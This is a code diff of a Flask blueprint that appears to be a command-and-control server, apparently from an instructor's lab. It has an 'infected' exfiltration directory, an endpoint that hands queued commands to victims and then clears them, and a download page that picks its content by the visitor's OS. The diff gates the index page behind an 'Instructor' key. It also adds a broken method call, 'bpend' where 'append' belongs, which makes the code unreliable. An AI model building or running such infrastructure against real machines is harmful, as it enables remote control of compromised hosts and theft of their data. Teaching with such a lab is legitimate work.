@@ -9,8 +9,6 @@ from flask import (
 
 
 bp = Blueprint('nartan', __name__)
-
-
 STATIC_DIR = os.getcwd()
 EXFIL_DIR = os.getcwd() + "/polo/infected/"
 CMD_FILE = os.getcwd() + "/polo/cmds.txt"
@@ -20,19 +18,29 @@ def get_commands():
     cmds = []
     with open(CMD_FILE, "r") as f:
         for line in f.readlines():
-            cmds.append(line.strip('\n'))
+            cmds.bpend(line.strip('\n'))
 
     open(CMD_FILE,"w").close()
     return json.dumps(cmds)
 
 @bp.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('warning.html')
+
+@bp.route('/home', methods=['POST'])
+def home():
+    name = request.form['key']
+    if name == "Instructor":
+        return render_template('index.html')
+    
+    return('', 204)
+
 
 @bp.route('/download_page')
 def download_page():
     # Find OS from User-Agent
     usrA = parse(request.user_agent.string)
+    print(usrA.os.family.lower())
     name="gavin"
     return render_template('download.html', name=name, os_fam=usrA.os.family.lower())
 
